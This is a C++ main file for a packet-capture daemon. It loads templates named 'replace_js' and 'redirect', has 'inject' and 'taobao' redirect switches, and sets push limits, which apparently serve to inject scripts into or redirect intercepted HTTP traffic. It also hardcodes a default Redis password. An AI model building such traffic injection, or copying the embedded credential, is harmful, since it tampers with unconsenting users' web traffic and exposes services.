
#include "pcap_util.h"


#include "core.h"
#include "daemon.h"

ConfigLoader *conf = ConfigLoader::getInstance();
Redis* redis       = Redis::getInstance();

filterPolicy filter_policy;


string config_dir = "../conf/";
static const char      *config_file ="../conf/conf.ini";
static char      *receive_signal;
static bool is_daemon         = false;
static bool process_signal    = false;

int worker_num;

int push_total_times;
int push_interval;
bool is_inject;
bool taobao_redirect;
// #include "rocksdb/db.h"
// #include "rocksdb/slice.h"
// #include "rocksdb/options.h"

// using namespace rocksdb;
// string kDBPath = "rocksdb_simple_example";
void config_reload()
{
    conf->loadTemplate(config_dir+"template/js.tpl","replace_js");
    conf->loadTemplate(config_dir+"template/redirect.tpl","redirect");

    push_total_times = atoi(conf->get("lydpc","push_total_times","0")) ;
    push_interval    = atoi(conf->get("lydpc","push_interval","0")) ;
    taobao_redirect  = atoi(conf->get("lydpc","taobao","0"))==1?true:false;
    is_inject        = atoi(conf->get("lydpc","inject","0"))==1?true:false;

    conf->dump();
    filter_policy.loadPolicy(push_total_times,push_interval,config_dir);
}

void config_init()
{

    // 加载配置和js响应模板
    conf->init(config_file);
    // conf->loadTemplate("js.tpl","replace_js");
    // conf->loadTemplate("iframe.tpl","iframe");


    // 连接redis
    const char * redis_host     = conf->get("redis","host","127.0.0.1") ;
    int redis_port              = atoi(conf->get("redis","port","6379")) ;
    const char * redis_password = conf->get("redis","password","MhxzKhl") ;
    redis->connect(redis_host,redis_port,redis_password);

    worker_num = atoi(conf->get("lydpc","workers","2")) ;
    if(worker_num>64)
    {
        printf("Error and exit because worker_num is more than 64\n");
        exit(-1);
    }

    const char* log_name = conf->get("lydpc","log_name","lydpc") ;
    const char* log_path = conf->get("lydpc","log_path","log") ;
    const char* log_level = conf->get("lydpc","log_level","error") ;

    // 初始化日志
    if(strcmp(log_level,"debug")==0){
        log_init(LL_DEBUG, log_name, log_path);
    }else if(strcmp(log_level,"error")==0){
        log_init(LL_ERROR, log_name, log_path);
    }

    LOG_DEBUG("service start initialize config");
    LOG_DEBUG("redis host:%s ",redis_host);
    LOG_DEBUG("redis port:%d ",redis_port);

    // filter_policy.loadPolicy();
    config_reload();
}

// 处理系统信号
void sighandler(int signum)
{
   LOG_DEBUG("Caught signal %d \n", signum);

   if (signum==SIGUSR1)
   {
        LOG_DEBUG("reload config");
        config_reload();
        LOG_DEBUG("reload config finished");
   }else{
        LOG_DEBUG("process exit.");
        exit(0);
   }
}


int get_options(int argc, char *const *argv)
{
    char     *p;
    int   i;

    for (i = 1; i < argc; i++) {

        p = (char *) argv[i];

        if (*p++ != '-') {
            printf("%s\n", "invalid option: \"%s\"\n", argv[i]);
            return LYDPC_ERROR;
        }

        while (*p) {
            switch (*p++) {
                case 'c':
                    // -cdpc.conf
                    if (*p) {
                        config_file = p;
                        goto next;
                    }
                    // -c dpc.conf
                    if (argv[++i]) {
                        config_file = (char *) argv[i];
                        goto next;
                    }
                    printf("option \"-c\" requires file name\n");
                    return LYDPC_ERROR;
                case 'd':
                    is_daemon = true;
                    break;
                case 's':
                    if(*p){
                        receive_signal = p;
                    }
                    if(argv[++i])
                    {
                        receive_signal = (char *) argv[i];
                    }
                    if(strcmp(receive_signal,"reload")==0)
                    {
                        process_signal = true;
                    }else{
                        printf("option \"-s\" requires signal\n");
                        return LYDPC_ERROR;
                    }
                    goto next;
                default:
                    printf("invalid option: \"%c\"\n", *(p - 1));
                    return LYDPC_ERROR;
            }
        }

        next:
        continue;

    }
    return LYDPC_OK;
}


int main(int argc, char *const *argv)
{


    if(get_options(argc,argv)!=LYDPC_OK)
    {
        return LYDPC_ERROR;
    }

    if (process_signal)
    {
        // 找到主进程pid
        // 发送信号
        printf("process signal %s\n", receive_signal);
        if (strcmp(receive_signal,"reload")==0)
        {
            int pid = get_pid();
            printf("reloading pid=%d\n",pid);
            kill(pid,SIGUSR1);
        }
        exit(0);
    }




    // 守护进程方式运行
    if(is_daemon){
        init_daemon();
    }

    // 初始化配置
    config_init();
    // 监听信号
    signal(SIGUSR1, sighandler);
    // 抓包开始
    pthread_t pcap_thread;
    pthread_t * workers_poll;
    int * thread_ids;
    int ret_state;
    workers_poll = (pthread_t*)malloc(sizeof(pthread_t)*worker_num);
    thread_ids   = (int*)malloc(sizeof(int)*worker_num);

    // 启动抓包线程
    ret_state = pthread_create(&pcap_thread,NULL,pcap_init,NULL);
    // 启动工作线程
    for (int i = 0; i < worker_num; ++i)
    {
        thread_ids[i] = i;
        ret_state     = pthread_create(workers_poll+i,NULL,http_handler_worker,&thread_ids[i]);
    }

    // 等待抓包线程
    pthread_join(pcap_thread,NULL);

    // pcap_init(NULL);


    // pcap_open("/home/ads/radius/cap_log.data");
    // pcap_open("/home/ads/radius/8001.data");
    // pcap_open("/home/ads/radius/radiurs_3G_11_7.data");
    return 0;
}



